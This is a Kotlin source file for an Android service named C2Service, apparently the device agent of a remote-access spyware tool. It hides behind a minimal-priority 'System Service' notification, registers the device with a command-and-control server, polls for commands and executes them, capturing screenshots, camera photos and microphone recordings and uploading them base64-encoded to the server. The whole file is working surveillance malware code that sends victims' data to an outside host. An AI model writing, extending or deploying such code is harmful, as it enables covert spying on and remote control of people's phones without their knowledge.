package com.outcome.c2

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class C2Service : Service() {

    companion object {
        private const val TAG = "C2Service"
        private const val NOTIF_ID = 1
        private const val CHANNEL_ID = "c2"
    }

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    private val deviceId: String by lazy { DeviceInfo.id(this) }
    private lateinit var serverUrl: String

    @Volatile private var projection: MediaProjection? = null

    private fun log(msg: String) {
        Log.i(TAG, msg)
        LogBus.append(applicationContext, "C2", msg)
    }

    override fun onCreate() {
        super.onCreate()
        log("onCreate deviceId=$deviceId")
        startForegroundCompat(ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)

        serverUrl = getSharedPreferences("c2", MODE_PRIVATE)
            .getString("server_url", BuildConfig.C2_URL)!!
        log("serverUrl=$serverUrl")

        tryInitProjectionFromPrefs()

        scope.launch { registerLoop() }
        scope.launch { pollLoop() }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        log("onStartCommand action=${intent?.action}")

        if (intent?.action == "START_PROJECTION") {
            val code = intent.getIntExtra("proj_result_code", Int.MIN_VALUE)
            val data: Intent? = if (Build.VERSION.SDK_INT >= 33)
                intent.getParcelableExtra("proj_data", Intent::class.java)
            else
                @Suppress("DEPRECATION") intent.getParcelableExtra("proj_data")

            log("START_PROJECTION code=$code hasData=${data != null}")

            if (code != Int.MIN_VALUE && data != null) {
                startForegroundCompat(ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
                initProjectionFromIntent(code, data)
            } else {
                log("START_PROJECTION invalid: code=$code")
            }
        }
        return START_STICKY
    }

    private fun startForegroundCompat(type: Int) {
        val notification = buildNotification()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIF_ID, notification, type)
            } else {
                startForeground(NOTIF_ID, notification)
            }
        } catch (e: Exception) {
            log("startForeground failed: ${e.message}")
        }
    }

    private fun initProjectionFromIntent(resultCode: Int, data: Intent) {
        log("initProjection: code=$resultCode")
        try {
            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            try { projection?.stop() } catch (_: Exception) {}
            projection = null

            val proj = mpm.getMediaProjection(resultCode, data)
            log("getMediaProjection: $proj")
            if (proj == null) {
                log("getMediaProjection returned NULL — permission already used or invalid")
                return
            }

            proj.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() {
                    log("projection onStop")
                    projection = null
                }
            }, Handler(Looper.getMainLooper()))
            projection = proj
            log("projection ACTIVE")
        } catch (e: Exception) {
            log("initProjection ERROR: ${e.message}")
            projection = null
        }
    }

    private fun tryInitProjectionFromPrefs() {
        val prefs = getSharedPreferences("c2", MODE_PRIVATE)
        val code = prefs.getInt("proj_code", Int.MIN_VALUE)
        val uri = prefs.getString("proj_data", null)
        log("tryInitProjectionFromPrefs code=$code hasUri=${uri != null}")
        if (code == Int.MIN_VALUE || uri == null) return
        try {
            val data = Intent.parseUri(uri, 0)
            startForegroundCompat(ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
            initProjectionFromIntent(code, data)
        } catch (e: Exception) {
            log("parseUri failed: ${e.message}")
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun buildNotification(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "System", NotificationManager.IMPORTANCE_MIN)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("running")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    private suspend fun registerLoop() {
        while (currentCoroutineContext().isActive) {
            try {
                val info = DeviceInfo.snapshot(this, deviceId)
                postJson("$serverUrl/api/agent/register", info)
            } catch (e: Exception) {
                log("register failed: ${e.message}")
            }
            delay(30_000)
        }
    }

    private suspend fun pollLoop() {
        while (currentCoroutineContext().isActive) {
            try {
                val body = JSONObject().put("device_id", deviceId)
                val resp = postJson("$serverUrl/api/agent/poll", body)
                val cmds = resp?.optJSONArray("commands") ?: JSONArray()
                if (cmds.length() > 0) log("received ${cmds.length()} commands")
                for (i in 0 until cmds.length()) {
                    val cmd = cmds.getJSONObject(i)
                    scope.launch { execute(cmd) }
                }
            } catch (e: Exception) {
                log("poll failed: ${e.message}")
            }
            delay(5_000)
        }
    }

    private suspend fun execute(cmd: JSONObject) {
        val id = cmd.getInt("id")
        val type = cmd.getString("type")
        val args = cmd.optJSONObject("args") ?: JSONObject()
        log("execute id=$id type=$type hasProjection=${projection != null}")

        val result = try {
            when (type) {
                "screenshot" -> {
                    val p = projection
                    if (p == null) {
                        log("screenshot: projection NULL")
                        JSONObject().put("error", "projection_not_ready")
                    } else {
                        log("screenshot: capturing...")
                        Screenshot.capture(this, p)
                    }
                }
                else -> CommandExecutor.run(this, type, args)
            }
        } catch (e: Exception) {
            log("execute failed: ${e.message}")
            JSONObject().put("error", e.message ?: "unknown")
        }

        val ok = !result.has("error")
        log("result id=$id type=$type ok=$ok")

        val payload = JSONObject()
            .put("command_id", id)
            .put("device_id", deviceId)
            .put("success", ok)
            .put("result", result)
        try { postJson("$serverUrl/api/agent/result", payload) } catch (_: Exception) {}

        val dataB64 = result.optString("data_b64", "")
        if (dataB64.isNotEmpty()) {
            val category = when (type) {
                "screenshot" -> "screenshot"
                "camera_photo" -> "camera"
                "mic_record" -> "mic"
                else -> "misc"
            }
            val ext = when (type) {
                "screenshot", "camera_photo" -> "jpg"
                "mic_record" -> "m4a"
                else -> "bin"
            }
            try {
                Uploader.uploadB64(this, serverUrl, deviceId, id, category, dataB64, "$type.$ext")
                log("uploaded $type.$ext (${dataB64.length / 1024} KB)")
            } catch (e: Exception) {
                log("upload failed: ${e.message}")
            }
        }
    }

    private suspend fun postJson(url: String, body: JSONObject): JSONObject? =
        withContext(Dispatchers.IO) {
            val req = Request.Builder()
                .url(url)
                .addHeader("X-Api-Key", BuildConfig.API_KEY)
                .post(body.toString().toRequestBody("application/json".toMediaType()))
                .build()
            client.newCall(req).execute().use { r ->
                r.body?.string()?.let { JSONObject(it) }
            }
        }

    override fun onDestroy() {
        log("onDestroy")
        try { projection?.stop() } catch (_: Exception) {}
        projection = null
        scope.cancel()
        super.onDestroy()
    }
}
